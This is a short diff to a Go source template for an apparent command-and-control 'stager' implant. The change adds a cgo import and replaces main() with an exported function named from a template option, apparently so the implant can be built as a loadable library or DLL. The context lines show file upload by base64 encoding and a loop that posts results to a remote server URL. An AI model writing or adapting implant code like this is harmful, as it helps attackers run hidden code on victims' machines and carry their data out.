@@ -18,6 +18,7 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	"C"
 )
 
 // constants defined by the stager
@@ -304,7 +305,8 @@ func upload_file(file_name string) {
 	output, success = base64.StdEncoding.EncodeToString(bytes), true
 }
 
-func main() {
+//export {{stager.options["exported_function"]}}
+func {{stager.options["exported_function"]}}() {
 	client := init_stager()
 
 	for {
@@ -367,4 +369,8 @@ func main() {
 			client.Post(URL+"/finish/"+name, "application/json", bytes.NewBuffer(data))
 		}
 	}
+}
+
+func main() {
+
 }
